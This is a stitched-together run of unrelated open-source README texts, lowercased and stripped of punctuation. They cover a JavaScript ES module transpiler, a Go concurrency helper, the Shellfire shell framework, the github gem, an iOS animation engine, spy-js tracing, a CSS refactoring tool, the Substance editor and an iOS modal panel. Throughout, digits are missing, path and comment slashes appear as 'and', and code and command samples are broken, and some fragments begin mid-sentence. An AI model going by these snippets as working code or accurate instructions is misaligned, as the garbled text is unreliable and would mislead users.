newtrigger f   newtrigger f   newtrigger c   return this the newtrigger convenience method creates a new trigger  passes it the existing audiocontext  and adds keyboard event listeners oh my customizing trigger s createvoices method redux you can also pass a custom createvoices method to instrument and it will in turn pass that function to each trigger instance that it creates see the main trigger description above for details  instrument comes with a built in score that you might recognize as click the pulsing play button to run it this is equivalent to instrument scoreplay in code check out the source to see how we re able to compose the melody and harmony separately and instrument scoreload blends them together composing scores are just arrays ingested three entries at a time  delay time relative to the previous command   trigger id to engage  engagement duration i find it s easiest to write the durations in fractions like the musical notation they are replacing  quarter note  half note and so on here s a sample from the default score javascript melody  and  c   and  and and do e  and  d   and  and and a  and  e   and  and and deer  and  c   and  and and a  and  e   and  and and fe  and  c   and  and and male  and  e   and  and and deer  in the future it might make more sense to separate score into its own class beep s naming conventions could use some tightening and there is definitely a need for more explanation and a demo related to the difference between and so much more to come it s early

8145816, this project is part of esnext which has merged with babel all the features of esnext are supported by babel and more all the tests from esnext have been ported over to babel to ensure that switchers will have minimal code changes to make the maintainers of esnext will continue working on babel to bring better spec compliance es feature support and performance if you want a fast tool with bundling support as found in this project you should check out rollup es module transpiler is an experimental compiler that allows you to write your javascript using a subset of the es module syntax and compile it into amd or commonjs modules this compiler provides a way to experiment with es syntax in real world scenarios to see how the syntax holds up it also provides a nicer more declarative way to write amd or commonjs modules see the changelog and changelog md for the latest updates the easiest way to use the transpiler is from an existing build tool there several plugins developed for different build tools the transpiler can be used directly from the command line npm install g es module transpiler compile modules convert foo js here is the basic usage compile modules convert i lib o out file file you can also use the transpiler as a library javascript var transpiler require es module transpiler var container transpiler container var fileresolver transpiler fileresolver var bundleformatter transpiler formatters bundle var container new container resolvers new fileresolver lib and  formatter new bundleformatter container getmodule index container write out and mylib js there are two types of exports named exports like the following javascript and and foobar js var foo foo  bar bar export foo bar this module has two named exports foo and bar you can also write this form as javascript and and foobar js export var foo foo export var bar bar either way another module can then import your exports like so import foo bar from foobar console log foo and and foo you can also export a default export for example an esified jquery might look like this javascript and and jquery js var jquery function jquery prototype export default jquery then an app that uses jquery could import it with javascript import from jquery the default export of the jquery module is now aliased to a default export makes the most sense as a module s main export like the jquery object in jquery you can use default and named exports in parallel a bare import that doesn t import any identifiers is useful for executing side effects in a module for example and and alerter js alert alert alert and and alertee js import alerter and and will pop up alert box this is super important default exports bind to an identifier on the module called default internally the transpiler will use this default identifer when importing but any outside consumer needs to be aware that it should use the default key and not the module itself for example a commonjs consumer should look like this var require jquery default add this project to your application s package json by running this npm install save es module transpiler or install it globally npm install g es module transpiler library on which this one is based thanks to dave to write this library thanks to domenic project even better and finally thanks to the javascript community at square for helping to write and release this library  fork it  create your feature branch git checkout b my new feature  commit your changes git commit am add some feature  push to the branch git push origin my new feature  create new pull request any contributors to the master es module transpiler repository must sign the individual contributor license agreement cla cla it s a short form that covers our bases and makes sure you re eligible to contribute when you have a change you d like to see in the master repository send a pull your request we ll make sure you re in the list of people who have signed a thanks and enjoy living in the es future
15968733, note this package became obsolete i started it when i was learning go a couple of years ago i see so many better ways to implement them all now so don t keep using this package as an ultimate reference coop contains some of the most common concurrent program flows i personally use in go i m suggesting you to use this package as a snippets reference and cheat sheet instead of a library the functionally provided in this package can be obtained in many different ways and frankly with more performant implementations depending on the type of your problem coop contains implementations for the following flows runs fn at t returns a boolean channel that will receive a message after fn returns the following example prints hello world in a minute and blocks the goroutine its running in until fn is completed done coop at time now add time minute  func fmt println hello world done and and wait for fn to be done runs fn once in every provided duration until t returns a boolean channel that will receive a message after fn returns the following example prints hello world every minute until tomorrow and blocks the goroutine its running in until the job is completed done coop until time now add  time hour  time minute func fmt println hello world runs fn after duration returns a boolean channel that will receive a message after fn returns the following example prints hello world after a second and blocks until fn is completed done coop after time second func fmt println hello world runs fn once in every duration and never stops the following example will print hello world once in every second coop every time second func fmt println hello world runs fn and cancels the running job if timeout is exceeded the following example will timeout and fn will return immediately hello world will not printed  the value read from the done channel will be false if timeout occurs true if fn is completed done coop timeout time second func time sleep time hour fmt println hello world done and and will return false because timeout occurred runs the list of fns concurrently returns a boolean channel that will receive a message after all of the fns are completed the following example will start  printing jobs concurrently and wait until all of them are completed printfn func fmt println hello world coop all printfn printfn printfn printfn similar to coop all but with limiting runs the list of fns concurrently but at most num fns at a time returns a boolean channel that will receive a message after all of the fns are completed the following example will start  printing jobs immediately and run the left out one once the first  is completed it will block the goroutine until all  are finished printfn func fmt println hello world coop allwiththrottle  printfn printfn printfn printfn runs fn n time concurrently returns a boolean channel that indicates all runs are completed the following example prints hello world  times and waits for all printing jobs are finished coop replicate  func fmt println hello world copyright  google inc all rights reserved licensed under the apache license version   the license you may not use this file except in compliance with the license you may obtain a copy of the license at

23907678, shellfire is a mit licensed framework for building modular applications in posix compliant shell script it is designed to abstract away the differences and myriad bugs between multiple shell interpreters implement common idioms and functionality promote re use of shell code with a modern modular set of functions to get practical things done fast work effectively with structured data formats such as json xml and debian control files enable the development of fully standalone scripts complete with resources snippets allow shell scripts to automatically determine and install their dependencies but have a minimal need to shell out to binaries that might not be there or might not behave shellfire consists of a number of github repositories called modules each module contains functions or resources in a specific namespace you create a shellfire application by making a new repository typically on github with a skeleton structure and then adding the modules you need you populate a template shell script and then just code away it couldn t be easier shellfire scripts work straightaway from source control when you re ready to do a release you can use fatten to make a standalone script and swaddle to then deploy it to github releases pages etc as tarballs debs etc try the overdrive tutorial you ll be up and running with your first shellfire application in  mins in homage to python batteries are included here s the list of modules and namespaces core  the daddy of them all includes such beauties as compatiblity functions abstracting away differences and allowing things like pushd in all shells a set of base decode functions which decode regardless of what binaries you ve got if any at all a dependency framework to document required binaries set up the path and automatically install packages that contain them so you can rely on date doing the same thing on mac os x as well as linux say a fully fledged command line parser which handles long options argumented and unargumented values golfed arguments with no third party dependencies help messages version information verbosity settings non options and more snippets so you can embed data text here docs or even specialised binaries inside shell scripts important to version control data resources and here docs separately one liner child process clean up terminal aware colour coded messages which know about ansi and tput and fallback gracefully a hierachial configuration framework so administrator and users can have their own settings for any command line switch configuration can be broken into fragments like debian run parts  so that common across environments can be checked in and passwords kept separate insecurely permissioned files aren t loaded administrators can also prevent overrides of sensitive values validation and path testing functions indirect variable access a boolean type string functions startswith contains etc trivial to use but always secure random and cleaned up temporary files and folders signal management arrays even for shells without them and more build  functions for creating build scripts as well as a ready to use binary build to drop in and make builds easy peasy byte  functions for setting and testing bits compress  a simple consistent interface to compression file extensions and associated mime types configure  an additional framework for more advanced configuration used by swaddle to let users define simple configuration files for package and repository definitions cpucount  functions to help with enumerating cpu numbers and deciding on load averages curl  superb interface to curl that works with the shell securely wraps curl so urls headers and credentials don t leak in process lists or environment variables and parses headers etc afterwards debian  a small framework that includes a complete debian control file parser git  a small framework of wrapper functions to make it easier to use git from shellfire applications github api  a rest interface that uses curl  urlencode  jsonreader and jsonwriter currently only supports enough to support swaddle  but if you re looking for an open source project this is one to do a complete command line shell based github client would be a real win and one for linode and digital ocean and jsonreader  a pure shell json reader raises events rather than creating an anaemic dom of objects and lists which has always been the right way to deal with structured data think sax for json jsonwriter  writes json random  a small framework to obtain random numbers and characters in shell script using fallbacks to progressively less random sources unicode  to correctly encode code points in utf  and utf  uggh urlencode  for all the myriad url encodings possible includes a uri template level  encoder version  a simple module to compare version numbers yes i know that s normally bad but some things like curl need it as we can t do feature detection xmlwriter  writes xml of course this is just a start if there s something you d like to see code it and submit a pull request additionally there s also fatten  to make standalone shell scripts paths d  which contains common locations and package names for different package managers used by core s dependency framework as a source of information on where to find programs swaddle  to package everything up create repositories and push to github whether as a deb rpm tarball or z or more tutorial  the tutorial and if you ve had to work with some of the backwards is forwards sysadmins i have had to in some strange organisations doing it all in the shell is the only way of getting it done at all ps if we could have our time again with the syntax of posix shell script we probably would but we re stuck with it the flip side is it hasn t changed in  years so today it works almost anywhere  well not much yet but who knows there s currently swaddle  a tool for packaging building package repositories signing them deploying their keys and publishing them on github pages or wherever fatten  shellfire s own fattening tool developjs  kisanhub s foundational javascript framework luvi builder  a simple wrapper around luvi we re proficient in all of them and we ve delivered some seriously hard core stuff in our time message queue brokers that handle  simultaneous users in c postgresql network protocols in java static webframeworks in ruby devops automation in python oh and a portfolio trading system in c a professional uses the language most appropriate to the problem domain we do have beards and sandles though code is known to run well on linux including as old as centos  which is pretty obsolescent mac os x using homebrew where necessary the bsds all of them solaris we plan to support major distributions whilst their owners support them as long as we can access without cost to the underlying technologies we have limited interest in supporting obscure dying or dead commercial platforms eg hp ux tru we work well on posix shells that support a local keyword or alias bash   and bash as sh ash derivatives busybox ash ksh derivatives pdksh aix ksh solaries ksh yash is not there yet but could be if there s interest we re not going to support ksh as it s just too different and zsh great as it is an interactive shell is a bit hit and miss mingw msys uses bash   which mostly works but has some terrible ifs handling bugs in particular this affects arrays this can be worked around but a generic solution handicaps all other shells follow the tutorial and you ll be up and running your first shellfire application in  mins

37035723,  some examples of the tasks the table below links to the available scripts if there s not a link it means i haven t committed the code some of them i had to rethink a less verbose solution or the target changed as the internet sometimes does  and now this repo has taken a backseat to many other data projects on my list     and  note  the related url links to either the official source of the data or at least a page with some background information the second column of this table refers to line count of the script not the answer to the prompt the repo currently contains scripts for  of  tasks and title and line count and and and and each task is meant to be a self contained script you run it and it prints the answer i m looking for the scripts and scripts in this repo should just work if you have all the dependencies installed that i had while writing them and the web urls they target haven t changed so basically these may not work at all to copy the scripts quickly via the command line by default a and search script scrape directory will be created to run a script cd search script scrape python scripts and  py to reiterate each of these scripts are meant to print out single answers and so they don t actually show the full potential of how programming can automate data collection as you get better at programming and recognizing its patterns you ll find out how easy it is to abstract what seemed like a narrow task into something much bigger for example script  scripts and  py prints out the number of times laughter broke out in the most recently transcribed supreme court argument change two lines and that script will print out the laugh count in every transcribed supreme court argument demo here scratchpad and morescotuslaughs py and of course in real world data projects you aren t typically interested in just printing the answer to your terminal you generally want to send them to a spreadsheet or spreadsheet and eventually to a web application or other kind of publication that s just a few more lines of programming too so while this repo contains a bunch of toy scripts see if you can think of ways to turn them into bigger data explorations the original requirement was that students finish all  scripts by the end of the quarter that didn t quite work out so i reduced the requirement to  it was a bad idea to make this a oh just turn it in at the end of the year  as most people have the tendency to wait for finals week to do such work most of the tasks are pretty straightforward in terms of the python programming the majority of the time is figuring out exactly what the hell i m referring to so next time i do this i ll probably provide the url of the target page rather than having people attempt to divine the google path i used to get to the data
1653, this gem works hand in hand with github s api to help you out catch us in the github room on freenode if you want to get involved or just fork and send a pull request gem install github only installs pure json gem jsonpure by default if you are able to install the c extension json gem it will use that instead gem install json github let s say you just forked github gem on github from defunkt gh clone you and github gem cd github gem gh pull defunkt this will setup a remote and branch for defunkt s repository at master in this case a defunkt and master branch if defunkt makes some changes you want simply github pull defunkt this will leave you in the defunkt and master branch after pulling changes from defunkt s remote after confirming that defunkt s changes were what you wanted run git checkout master and then git merge defunkt and master to merge defunkt s changes into your own master branch in summary gh pull defunkt gh checkout master gh merge defunkt and master if you ve already reviewed defunkt s changes and just want to merge them into your master branch use the merge flag gh pull merge defunkt if you are the maintainer of a project you will often need to fetch commits from other developers evaluate and and or test them then merge them into the let s say you are defunkt and mojombo has forked your github gem repo made some changes and issues you a pull request for his master branch from the root of the project you can do gh fetch mojombo master this will leave you in the mojombo and master branch after fetching his commits your local mojombo and master branch is now at the exact same place as mojombo s master branch you can now run tests or evaluate the code for awesomeness if mojombo s changes are good you ll want to merge your master or another branch into those changes so you can retest post integration gh merge master test and analyze again and if everything is ok gh checkout master gh merge mojombo and master the latter command will be a fast forward merge since you already did the real merge previously the github gem can also show you all of the commits that exist on any fork of your project your network that you don t have in your branch yet in order to see the list of the projects that have commits you do not you can run gh network list which will show you all the forks that have changes if you want to see what those changes are you can run gh network commits which will show you something like this b jchris and gist kevin sb org add gist binary  months ago caf jchris and gist  kevin sb org tweak rakefile spec

commits that you don t have in your current branch that have been pushed to other forks of your project if you want to incorporate them you can use gh cherry pick eea for example to apply that single patch to your branch you can also merge a branch if you want all the changes introduced in another branch gh merge jchris and gist the next time you run the github network commits command you won t see any of the patches you have cherry picked or merged or rebased if you want to ignore a commit you can simply run gh ignore aceb then you won t ever see that commit again or if you want to ignore a range of commits you can use the normal git revision selection shorthands for example if you want to ignore all  jchris and gist commits there you can run gh ignore jchris and gist you can also filter the output if you want to see some subset you can filter by project author and date range or one of the cooler things you can filter by whether the patch applies cleanly to your branch head or not for instance i can do this and bin and github network commits applies caaf jchris and master  jchris grabb it fixed github gemspecs broken referen  weeks ago eea luislavena and master luislavena gmail com

24212800, intuanimationengine makes it easy to build advanced custom animations on ios intuanimationengine provides a friendly interface to drive custom animations using a cadisplaylink inspired by the uiview block based animation api it enables interactive animations normally driven by user input such as a pan or pinch gesture to run automatically over a given duration it can also be used to get a callback every frame of an animation intuanimationengine includes an extensive library of easing functions that can be used to customize animation timing as well as a complete library of interpolation functions to animate any type of value or property including those that are not animatable by core animation the project also includes a standalone spring physics library to simulate damped harmonic motion this is used under the hood to power a spring animation api on intuanimationengine that allows full control over the damping stiffness and mass parameters since the spring solver is a completely independent and generic library implemented in pure c it can be used on its own for many other applications apart from animation intuanimationengine requires ios   or later ruby pod intuanimationengine  run pod install from terminal then open your app s xcworkspace file to launch xcode  import the intuanimationengine h header typically this should be written as import intuanimationengine and intuanimationengine h the spring solver used by intuanimationengine is available as a standalone c library where it can be used for other applications including ones that are not related to animation the spring solver has its own cocoapods subspec so that it can be installed separately from the rest of the intuanimationengine project to install the spring solver only add the following line to your podfile pod intuanimationengine and springsolver note that installing intuanimationengine using pod intuanimationengine automatically includes the spring solver library as a dependency  download the contents of the intuanimationengine directory intuanimationengine  add all the files to your xcode project drag and drop is easiest  import the intuanimationengine h header the primary difference between intuanimationengine and the uiview animation methods is how the animations block works with the uiview methods the animations block is only executed once and the changes made to views within this block represent the new state at the end of the animation with intuanimationengine the animations block is executed many times during the animation once per frame  and each time it is executed your code inside the block should update the state of views based upon the current value of the percentage or progress passed into the block typically you ll want to use one of the interpolation functions included in this library to help generate all the intermediate values between the start and end states for a given property there are a few different api methods on intuanimationengine that can be used to start an animation and intuanimationid animatewithduration nstimeinterval duration delay nstimeinterval delay animations void cgfloat percentage animations completion void bool finished completion this method will start an animation that calls the animations block each frame of the animation passing in a percentage value that represents the animation s current percentage complete the completion block will be executed when the animation completes with the finished parameter indicating whether the animation was canceled and intuanimationid animatewithduration nstimeinterval duration delay nstimeinterval delay easing intueasingfunction easingfunction animations void cgfloat progress animations completion void bool finished completion this method will start an animation that calls the animations block each frame of the animation passing in a progress value that represents the current progress of the animation taking into account the easing function the easingfunction can be any of the easing functions in intueasingfunctions h intuanimationengine and intueasingfunctions h  or a block that defines a custom easing curve the completion block will be executed when the animation completes with the finished parameter indicating whether the animation was canceled there is also another variant of the above method that takes an options parameter which is a mask of intuanimationoptions this can be used to repeat or autoreverse animations and intuanimationid animatewithdamping cgfloat damping stiffness cgfloat stiffness mass cgfloat mass delay nstimeinterval delay animations void cgfloat progress animations completion void bool finished completion this method will start a spring animation that calls the animations block each frame of the animation passing in a progress value that represents the current progress of the animation the animation will simulate the physics of a spring mass system with the specified properties damping  the amount of friction must be greater than or equal to zero if exactly zero the harmonic motion will continue indefinitely typical range   to   stiffness  the stiffness of the spring must be greater than zero typical range   to   mass  the amount of mass being moved by the spring must be greater than zero typical range   to   note that the total duration of the animation is determined by simulating a spring mass system with the above parameters until it reaches a resting state the completion block will be executed when the animation completes with the finished parameter indicating whether the animation was canceled and void cancelanimationwithid intuanimationid animationid when starting an animation you can store the returned animation id and pass it to the above method to cancel the animation before it completes if the animation is canceled the completion block will execute with finished parameter equal to no intuinterpolationfunctions h intuanimationengine and intuinterpolationfunctions h is a library of interpolation functions for discrete values where linear interpolation does not make sense  there are two proxmial interpolation functions for example intuinterpolatediscrete nstextalignmentleft nstextalignmentright progress and and returns nstextalignmentleft when progress is   nstextalignmentright otherwise intuinterpolatediscretevalues nstextalignmentleft  nstextalignmentcenter  nstextalignmentright  progress integervalue and and returns nstextalignmentleft then nstextalignmentcenter and finally nstextalignmentright as progress increases from   to   for continuous values there are a variety of linear interpolation functions the following types are supported cgfloat cgpoint cgsize cgrect cgvector uioffset uiedgeinsets uicolor and cgcolor there is also an untyped function intuinterpolate that takes values of type id and returns an interpolated value by automatically determining the type of the values proximal interpolation is used if the value types do not match or if linear interpolation isn t supported for their type there are no functions that directly interpolate transforms this is by design linear interpolation of raw matrices often yields unexpected or invalid results to interpolate between two transforms decompose them into their translation rotation and scale components cgfloat rotation intuinterpolatecgfloat   mpi progress view transform cgaffinetransformmakerotation rotation and and view will rotate from upright progress   to upside down progress   you can concatenate transforms to combine them cgfloat rotation intuinterpolatecgfloat   mpi progress cgfloat scale intuinterpolatecgfloat     progress view transform cgaffinetransformconcat cgaffinetransformmakescale scale scale  cgaffinetransformmakerotation rotation and and view will rotate from upright and full size progress    to upside down and half size progress   when interpolating between two colors both colors must be in the same color space grayscale rgb or hsb interpolating between colors in the hsb color space will generally yield better visual results than the rgb color space uicolor colorwithwhite   alpha   and and grayscale color space white uicolor colorwithred   green   blue   alpha   and and rgb color space white uicolor colorwithhue   saturation   brightness   alpha   and and hsb color space white

11573065, this documentation covers various topics not covered or covered briefly in webstorm web help and contains overview overview license license installation notes installation configuration documentation configuration and full configuration example full example and tips configuration tips phantomjs phantomjs karma runner karma runner development proxy like fiddler or charles proxy configuration development proxy configuration and https tracing configuration example https tracing mobile device proxy configuration mobile device configuration virtual machine configuration virtual machine configuration troubleshooting known issues and limitations known issues in a nutshell spy js is a tool for javascript developers that allows to simply debug and trace and profile javascript when running on different platforms and browsers and devices it fills gaps that existing browser development tools have and tackles common development tasks from a different angle documentation and code samples in this repository are licensed under mit spy js tool itself isn t open source spy js can work with zero configuration or be configured with conf js configuration file configuration code is just a simple valid javascript file javascript module exports function and and configsetting value and and configsetting value and and many other settings root url is a url of the page and website you d like to trace set it to isolate your session from receiving events from any other websites and pages javascript url mapper is one of the most important bits of the session configuration when given the url for the script the mapper function is supposed to return a configuration object for the script the configuration object contains various settings affecting how the script should be processed by spy js mapper function can return different configuration objects for different script urls configuration object should have following structure javascript and and configuration object instrument true default instrumentation settings used and false script will not be traced and instrumentation settings object and not set same as false and and instrumentation settings object prettify true and false default and not set same as false  objectdump false and dump settings object and not set default dump settings object with default settings used and and dump settings object depth number and not set default  used  propertynumber number and not set default  used  arraylength number and not set default  used  stringlength number and not set default  used instrument property that specifies how the script from the given url will be modified if at all and what data will be collected at runtime set the property to false to not trace the script set the property to true to use default values or specify the object with settings instrument prettify property that specifies whether to make the script look nice in case it is minified or badly formatted instrument objectdump property that specifies whether any runtime data apart from stack trace should be collected and to what extent set the property to false if you don t want to collect the runtime values don t set the property if you want to use default object dump settings or specify your own settings object instrument objectdump depth property that specifies how many levels of nesting within an object should be traversed and logged instrument objectdump propertynumber property that specifies how many first properties within an object should be logged at any allowed level of logged object hierarchy instrument objectdump arraylength property that specifies how many array elements should be logged at any allowed level of logged object hierarchy instrument objectdump stringlength property that specifies the limit of number of characters in logged string properties for example if a function in runtime returns something like javascript p true b abcdefghij  c false and instrument objectdump depth is  instrument objectdump propertynumber is  instrument objectdump arraylength is  and instrument objectdump stringlength is  then in the stack trace or the code editor you ll be able to see following representation of the object javascript   a b ab    because of the depth constraint we don t see the first array element a property value level  is traversing array level  is traversing its element only see the two first properties of the first array element because of the property number constraint only see the first two characters of the first array element b string property because of the string length constraint only see the first array element object dump because of the array length constraint event filter allows to specify what kind of events are captured and displayed in spy js ui there are five properties in the event filter object that you can set globalscope timeout interval events and noevents with the following event filter spy js will show program execution scope scripts loading  intervals will not show timeouts will show all events except blacklisted domcontentloaded and keyup javascript eventfilter globalscope true timeout false interval true noevents domcontentloaded  keyup with the following event filter spy js will not show program execution scope scripts loading  will show intervals and timeouts will only show whitelisted click and keyup events javascript eventfilter globalscope false timeout true interval true events click  keyup let s have a look at a complete sample of a configuration file to see how it all works together javascript module exports function mapper function url if url indexof jquery  return instrument false if url indexof underscore    min js  return instrument prettify true objectdump false  return instrument prettify false objectdump depth  propertynumber  arraylength  stringlength   eventfilter globalscope false timeout true interval true events click mapper above is configured not to trace jquery or any jquery plugins or related scripts if they have jquery string in their url it is also configured to trace minified underscore library prettify it but not collect any runtime data from it mapper is not prettifying them because these are local scripts that are formatted nicely anyway and constraining object dumps to reasonably low limits to avoid any performance issues on the traced website traversing objects and sending dumps across the wire does take additional time when tracing the website according to the specified event filter we ll only see the code executed by timeouts intervals and click events for best performance turn off prettifying for already nicely formatted non minified files set reasonably low object dump limits exclude scripts you are not interested in by setting instrument to false this can be done for example for libraries you wouldn t want to step in whitelist and blacklist events you would like and would not like to see by using event filter setting it is recommended to save your session configuration file as spy conf js or spy all conf js and spy nolibs conf js etc in your project folder and commit and check in your vcs system so the configuration could be shared across your project team phantomjs is a headless webkit so simple spy js configuration is sufficient to trace web pages loaded by it in the example below i ll illustrate how to use spy js to trace jasmine tests running by phantomjs from grunt using webstorm grunt console in the example below i ll illustrate how to use spy js to trace jasmine tests running with karma runner in chrome and phantomjs if you re using a development proxy for instance to map minified files and replace them with local development versions it is still possible to use spy js to instrument and trace those development versions of javascript files in the example below it s illustrated how to make fiddler work with spy js in webstorm the idea is to request your non minified files via spy js proxy server using local proxy mode urls in the example i ll replace minified sh javascript min js file from nodejs org with my version sh javascript js using fiddler and will trace sh javascript js execution using spy js start fiddler and spy js run configuration the order doesn t matter  access the page in browser and see it being traced in webstorm first autoresponder rule uses a regular expression to replace all files like file min js with corresponding file js last two rules are mandatory to make spy js work on the page even though spy js itself doesn t support tracing https secured web pages you can still use it for tracing with a tool that can do ssl termination for example with a development proxy like fiddler or charles proxy in the example below it s illustrated how to make fiddler work with spy js in webstorm to trace https secured website the idea is to use fiddler to decrypt https traffic and request javascript files via spy js proxy server using local proxy mode urls in the example i ll demonstrate how to set up fiddler and spy js to trace github website other development proxies may need a different configuration but the idea should still be applicable the first autoresponder rule uses a regular expression to request all js files via spy js proxy the last two rules are mandatory to make spy js work on the page the highlighted line just adds an additional http response header the header is required to configure content security policy for browsers that support it to evaluate spy js tracer code if you are using a virtual machine for instance on a develepment machine with mac and webstorm spy js installed and hosting windows vms via virtual box it is possible to use spy js to trace web sites opened inside ie or another browser on vm instances and view the trace in your webstorm first create and start spy js run configuration in webstorm on your development machine you can use default trace server port   leave url to trace field empty and not check automatically configure system proxy checkbox because the proxy configuration is not required on your development machine it s required on the vm and will be performed manually ip address of your development machine for the address avoid using fake     ip address spy js run configuration trace server port for the port  if you didn t change it uncheck the bypass proxy server for local addresses setting go to the advanced settings and add loopback string to the exceptions field down at the bottom if spy js tracing doesn t work for you and console output or log file doesn t contain any explanation  try this if you re using chrome when tracing session is running make sure chrome and and net internals and proxy page effective proxy settings is using spy js proxy pac if not try re applying the settings or clearing bad proxy list on the page if any do force refesh ctrl and command and f or ctrl and command and r on the traced page to make sure the traced website scripts are not cached in your browser tracing scripts with incorrect or without content type response header is not supported some development web servers have default settings with incorrect content type response header or no content type response header for javascript files use your browser dev tools to check whether your script has correct content type response header text and javascript or application and x javascript or application and javascript tracing https secured websites is not supported at the moment however it is possible to set up a development proxy to use with spy js to trace https secured pages https tracing tracing html pages with inline javascript is not supported at the moment integrated windows authentication is not supported execution time figures display the time required to execute modified code and thus may significantly differ from the real figures relatively to other spy js collected performance metrics they make sense and may be used to identify and fix bottlenecks

4450203, logo illustration and githubheader png logo the css ratiocinator automatically refactors your css and generates a new stylesheet for your site it works by examining your site s live dom in the browser and reverse engineering a new more elegant definition that captures styles down to the pixel it addresses the problem of old css whose styles accumulate and contradict each other after a certain point all css seems to grow only by internal antagonism the ratiocinator wipes the slate clean and provides a harmonious new beginning this program runs from the command line using the phantomjs headless browser  clone this repo  in the cloned directory run phantomjs ratiocinate js url  the new css will appear dt does this thing clobber or remove my styles and dt dd no if your page renders differently after using ratiocinator generated style then that s a bug this software may move styles around during the assessment stage of its algorithm but the end result respects the original styles you have created note that it may achieve these styles using a different combination of selectors and inheritance than your original css did and dd dt can it work on a whole site multiple pages and dt dd in principle yes but not yet the strategy will be to ajax the pages together into a single page with multiple body tags this long assembled page will provide enough data to the ratiocinator to create a new style that respects everything your site does and dd dt how is this different from other css tidying programs and dt dd the ratiocinator does not read your css files at all it ignores them completely it relies on the live dom to infer what your styles want to accomplish the thoroughness of the results you get are based on the quality and completeness of the example dom that you provide the program and dd dt does it capture styles for the sad path and dt dd it captures styles for whatever you show it so if you have styles for errors or form validation problems or various element states then you ll need to include the markup to demonstrate them the most effective input is a living style guide for your site you do use a style guide don t you and dd the ratiocinator proceeds in two phases assessment and consolidation during assessment it determines which nodes will need which styles accounting for browser defaults and cascade rules the browser provides a full list of computed style for every node and our first step is to prune redundancies from cascaded style in a depth first process called lifting lifting illustration and lift png lifting the last step in assessment is stripping default styles the final style needn t specify css defaults so we remove them prior to the consolidation phase next comes consolidation where we find shared pieces of style throughout the cleaned dom tree and extract them to css declarations consolidating illustration and consolidate png consolidating in the diagram above the ratiocinator will choose to output a declaration for the styles in red before those in blue although there are more blue items than red in element aside foo  there are more red elements overall the red has greater volume hence the ratiocinator will extract styles for all elements with class foo first and then for aside elements second finally the ratiocinator detects media query width breakpoints and samples the page style between them it analyzes the responsive portfolio and extracts common base style it outputs the base style and each width specific style with appropriate media queries currently anything phantom considers to be an invalid property value or selector is discarded this means that the following css display webkit box display moz box display ms flexbox display webkit flex display flex selection background rgba   color fff moz selection background rgba   color fff is compressed to the following css display webkit box this is an invalid compression a solution is being worked on in issue  issue it is currently very easy to contribute just find something that the ratiocinator does wrong and tell me the best complaints are very specific preferably made into a new test and submitted via a pull request luckily that s easy too  find some styles that the ratiocinator is botching  think of the smallest example that will illustrate the problem  add a new test by copying test and template html and filling in the blanks  save your new test in the test and folder  run phantomjs test js and make sure it fails  submit pull request to the bug reports branch the css ratiocinator is copyright   joe nelson it is free software and may be redistributed under the terms specified in the license file

furthermore we initialized a clipboard instance and tie it to the surface manager we also setup a registry for components such as paragraph and tools e g emphasistool strongtrool our editor will then be able to dynamically retrieve the right view component for a certain node type we provide a framework that allows building modelling a schema is easy var schema new substance document schema rich text article     substance has a number of predefined commonly used node types that we are going to borrow for our schema but defining our own is very simple too we ll define a node type highlight just as another annotation type we choose to use a container annotation type which means that the annotation can span over multiple paragraphs regular annotations like our emphasis and strong are scoped to one text property var paragraph substance document paragraph var emphasis substance document emphasis var strong substance document strong var highlight document containerannotation extend

getdefaulttexttype function return paragraph based on substance document we now define a javascript class that will hold our future documents var richtextarticle function richtextarticle super call this schema richtextarticle prototype function this initialize function this super initialize apply this arguments and and we will create a default container node body that references arbitrary many

s create an editor we re using react for our example but be aware that you can use substance with any other web framework or not use a framework at all our editor component receives the document as an input now as a first step our editor should be able to render the document passed in we will set up a bit of substance infrastructure first most importantly a substance surface that maps dom

editor rerender if the container changes a node is added or removed onselectionchanged to update the tools based on the new document selection we ll look into those handler implementations later first let s render our document for each node type we defined we need to define a component class with a render method here s how our paragraph implementation looks like var textproperty require substance ui and textproperty var react createelement class paragraph extends react component render return div  classname content node paragraph  data id this props node id  textproperty doc this props doc path this props node id content the paragraph is represented as a simple div however the text rendering is where things get difficult substance provides a generic implementation textproperty for rendering annotated text we just use this component here and refer to a path paragraph id and property name we don t need to implement annotation nodes strong emphasis  as there is a default renderer implemented for annotations now that we have our components ready we can head over to implementing the render method of our editor render var doc this props doc var containernode doc get body var

container determining the componentclass and constructing a react element from it we also provided a simple toolbar that has annotation toggles we will learn more about tools later when we implement a custom tool for our editor todo describe properties containers when you want to update a document you should wrap all your changes in a transaction so you don t end up in inconsistent in between states the api is fairly easy doc transaction function tx tx delete em and and deletes an emphasis annotation with id em var updated hello world doc transaction function tx tx set textnode content  updated and and updates content property of node textnode content tools must bind to mousedown instead of click to handle toggling that way we can prevent the blur event to be fired on the surface the root element of a substance surface must be set contenteditable  running the test suite headless using phantom js npm test  running the test suite in a browser for debugging npm start  running test suite using karma to generate a code coverage report npm run karma the report will be stored in the coverage folder

3140024, what is uamodalpanel  uamodalpanel is a highly customizable alternative modal panel that you can popup in your view controllers to show content that might not need an entire new screen to show it has a bounce animation content fade in and a fancy noisy gradient title bar it works on the iphone and ipad with or without rotation example video  step  prerequisites  you ll need at least xcode   and an ios   and project step   cocoapods way  simply add this line to your podfile pod uamodalpanel    run pod install go directly to step  step  implement uamodalpanel step  get uamodalpanel files add as git submodule  in terminal navigate to the root of your project directory and run these commands assuming your project is a git repo git submodule add git and and github com and coneybeare and uamodalpanel git submodules and uamodalpanel git commit m uamodalpanel added as submodule this creates new submodule downloads the files to submodules and uamodalpanel directory within your project and creates new commit with updated git repo settings thanks to the fact that you added uamodalpanel as submodule it is easy to keep it updated to the newest version by simply doing git submodule update step  add uamodalpanel to your project  copy files from example project open both the example project that you downloaded in step  above and your app s project in xcode drag the uamodalpanel group from the example project into your project s groups files make sure the  copy items into destination group s folder if needed  checkbox is unchecked xcode  note adding the files is different in xcode  first make sure your uamodalpanel project window is closed then you drag the uamodalpanel xcodeproj file from a finder window to your project you should see the uamodalpanel s proj tree open up within your project in xcode and then you should be able to drag uamodalpanel group as stated above you then must remove uamodalpanel xcodeproj whole uamodalpanel project from your project  so that it does not interfere with your project add frameworks expand the frameworks group in your project s file list make sure you have the following framework installed quartzcore framework if you are missing any frameworks right click the frameworks group and select add existing frameworks select the framework you are missing and add it to your project step  implement

